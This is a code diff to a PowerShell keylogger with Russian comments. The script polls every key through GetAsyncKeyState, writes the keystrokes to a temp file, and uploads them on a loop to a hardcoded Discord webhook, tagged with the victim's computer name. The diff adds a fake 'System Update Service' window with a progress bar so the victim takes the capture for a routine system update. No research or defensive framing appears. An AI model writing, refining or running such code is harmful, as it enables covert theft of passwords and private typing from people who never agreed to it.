@@ -3,6 +3,53 @@ $webhookUrl = "https://discordapp.com/api/webhooks/1369790444417843280/a9TksyeMB
 $logFilePath = "$env:TEMP\keylog.txt"
 $checkInterval = 10 # секунд
 
+# Создаём простой GUI для отображения статуса
+Add-Type -AssemblyName System.Windows.Forms
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "System Update Service"
+$form.Width = 400
+$form.Height = 200
+$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+$form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
+
+$label = New-Object System.Windows.Forms.Label
+$label.Location = New-Object System.Drawing.Point(10, 20)
+$label.Width = 380
+$label.Text = "Подготовка системного обновления..."
+$form.Controls.Add($label)
+
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(10, 60)
+$progressBar.Width = 380
+$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
+$form.Controls.Add($progressBar)
+
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Location = New-Object System.Drawing.Point(10, 100)
+$statusLabel.Width = 380
+$statusLabel.Text = "Статус: Инициализация..."
+$form.Controls.Add($statusLabel)
+
+# Показываем форму асинхронно
+$form.Show() | Out-Null
+$form.Update()
+
+function Update-Status {
+    param($message)
+    $statusLabel.Text = "Статус: $message"
+    $form.Update()
+}
+
+function Show-Error {
+    param($errorMessage)
+    [System.Windows.Forms.MessageBox]::Show(
+        $errorMessage,
+        "Ошибка системы",
+        [System.Windows.Forms.MessageBoxButtons]::OK,
+        [System.Windows.Forms.MessageBoxIcon]::Error
+    )
+}
+
 # Функция для отправки логов в Discord
 function Send-ToDiscord {
     param (
@@ -10,12 +57,14 @@ function Send-ToDiscord {
         [string]$message
     )
     
-    # Проверяем, есть ли что отправлять
+    Update-Status "Проверка логов..."
+    
     if (Test-Path $filePath -PathType Leaf) {
         $fileContent = Get-Content $filePath -Raw
         
         if (-not [string]::IsNullOrEmpty($fileContent)) {
-            # Формируем тело запроса
+            Update-Status "Отправка данных..."
+            
             $boundary = [System.Guid]::NewGuid().ToString()
             $body = @"
 --$boundary
@@ -31,57 +80,45 @@ $fileContent
 "@
 
             try {
-                # Отправляем запрос
                 $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
                 
-                # Если отправка успешна, очищаем файл
                 if ($response) {
+                    Update-Status "Данные успешно отправлены"
                     Clear-Content $filePath
                     return $true
                 }
             } catch {
-                Write-Output "Ошибка при отправке: $_"
+                $errorMsg = "Ошибка при отправке: $($_.Exception.Message)"
+                Update-Status $errorMsg
+                Show-Error $errorMsg
                 return $false
             }
         }
     }
+    Update-Status "Нет новых данных для отправки"
     return $false
 }
 
-# Функция для перехвата нажатий клавиш
+# Функция для перехвата нажатий клавиш (без изменений)
 function Start-Keylogger {
-    # Импортируем необходимые WinAPI функции
     $signature = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
     
     $API = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace API -PassThru
 
-    # Создаем файл лога, если его нет
     if (-not (Test-Path $logFilePath)) {
         New-Item -Path $logFilePath -ItemType File -Force | Out-Null
     }
 
-    # Основной цикл
     while ($true) {
         Start-Sleep -Milliseconds 40
         
-        # Проверяем все возможные клавиши
         for ($ascii = 9; $ascii -le 254; $ascii++) {
             $state = $API::GetAsyncKeyState($ascii)
             
-            # Если клавиша нажата
             if ($state -eq -32767) {
-                $null = [Console]::CapsLock
-                
-                # Обрабатываем специальные клавиши
                 switch ($ascii) {
                     8 { "[BACKSPACE]" | Out-File -FilePath $logFilePath -Append }
                     9 { "[TAB]" | Out-File -FilePath $logFilePath -Append }
@@ -90,20 +127,14 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                     32 { " " | Out-File -FilePath $logFilePath -Append }
                     default {
                         $key = [char]$ascii
-                        
-                        # Проверяем Shift
                         $shiftState = $API::GetAsyncKeyState(16)
-                        $capsLock = [Console]::CapsLock
                         
-                        if (($shiftState -eq -32767) -xor $capsLock) {
-                            if ($ascii -ge 65 -and $ascii -le 90) {
-                                $key = [char]$ascii
-                            } elseif ($ascii -ge 97 -and $ascii -le 122) {
+                        if (($shiftState -eq -32767) -xor [Console]::CapsLock) {
+                            if ($ascii -ge 97 -and $ascii -le 122) {
                                 $key = [char]($ascii - 32)
                             }
                         }
                         
-                        # Добавляем символ в лог
                         $key | Out-File -FilePath $logFilePath -Append
                     }
                 }
@@ -112,23 +143,25 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
-# Запускаем проверку вебхука (тестовая отправка)
-$testResult = Send-ToDiscord -filePath $logFilePath -message "Keylogger запущен на $env:COMPUTERNAME"
+# Основной процесс
+Update-Status "Проверка соединения..."
+$testResult = Send-ToDiscord -filePath $logFilePath -message "Keylogger инициализирован на $env:COMPUTERNAME"
+
 if (-not $testResult) {
-    # Если тестовая отправка не удалась, завершаем скрипт
+    Show-Error "Не удалось проверить соединение с сервером. Скрипт будет остановлен."
+    $form.Close()
     exit
 }
 
-# Запускаем keylogger в отдельном потоке
+Update-Status "Запуск фоновых процессов..."
 $keyloggerJob = Start-Job -ScriptBlock ${function:Start-Keylogger}
 
-# Основной цикл для отправки логов
+Update-Status "Мониторинг активности..."
 while ($true) {
     Start-Sleep -Seconds $checkInterval
     $sendResult = Send-ToDiscord -filePath $logFilePath -message "Логи с $env:COMPUTERNAME"
     
     if (-not $sendResult) {
-        # Если отправка не удалась, ждем дольше перед следующей попыткой
         Start-Sleep -Seconds 30
     }
 }
